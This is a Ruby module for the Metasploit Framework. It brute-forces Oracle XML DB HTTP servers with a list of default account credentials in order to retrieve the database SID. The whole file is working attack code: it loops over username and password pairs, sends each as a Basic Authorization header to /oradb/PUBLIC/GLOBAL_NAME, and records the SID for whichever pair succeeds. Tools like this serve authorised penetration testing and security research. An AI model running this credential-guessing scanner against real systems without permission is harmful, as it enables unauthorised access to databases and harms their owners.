##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report	
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Oracle XML DB SID Discovery via Brute Force',
			'Description' => %q{
					This module attempts to retrieve the sid from the Oracle XML DB httpd server, 
					utilizing Pete Finnigan's default oracle password list.
			},
			'Version'     => '$Revision: 6876 $',
			'References'  =>
				[
					[ 'URL', 'http://dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf' ],
					[ 'URL', 'http://www.petefinnigan.com/default/oracle_default_passwords.csv'],
				],
			'Author'      => [ 'nebulus' ],
			'License'     => MSF_LICENSE
		)

		register_options(
				[
					OptString.new('CSVFILE', [ false, 'The file that contains a list of default accounts.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'oracle_default_passwords.csv')]),
					OptBool.new('VERBOSE', [ false, 'Report each try', false]),
					Opt::RPORT(8080),
				], self.class)
		deregister_options('DBUSER','DBPASS')
	end

	def run_host(ip)
		begin

		res = send_request_raw({
			'uri'     => '/oradb/PUBLIC/GLOBAL_NAME',
			'version' => '1.0',
			'method'  => 'GET'
		}, 5)
		return if not res

		if(res.code == 200)
			print_status("http://#{ip}:#{datastore['RPORT']}/oradb/PUBLIC/GLOBAL_NAME (#{res.code}) is not password protected.") if datastore['VERBOSE']
			return
		end

		list = datastore['CSVFILE']

		fd = CSV.foreach(list) do |brute|

			datastore['DBUSER'] = brute[2].downcase
			datastore['DBPASS'] = brute[3].downcase
			user_pass = "#{datastore['DBUSER']}:#{datastore['DBPASS']}"
	
			res = send_request_raw({
				'uri'     => '/oradb/PUBLIC/GLOBAL_NAME',
				'version' => '1.0',
				'method'  => 'GET',
				'headers' =>
				{
					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
				}
			}, 5)

				if( not res )
					print_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...") if datastore['VERBOSE']
					next
				end
				if (res.code == 200)
					if (not res.body.length > 0)		
					# sometimes weird bug where body doesn't have value yet
						res.body = res.bufq
					end
					sid = res.body.scan(/<GLOBAL_NAME>(\S+)<\/GLOBAL_NAME>/)
						report_note(
							:host	=> ip,
							:proto	=> 'tcp',
							:type	=> 'SERVICE_NAME',
							:data	=> "#{sid}"
						)
					print_good("Discovered SID: '#{sid}' for host #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}")
				elsif(datastore['VERBOSE'])
					print_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...")
				end
		end
		print_status("Brute forcing #{ip}:#{datastore['RPORT']}...")
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
end
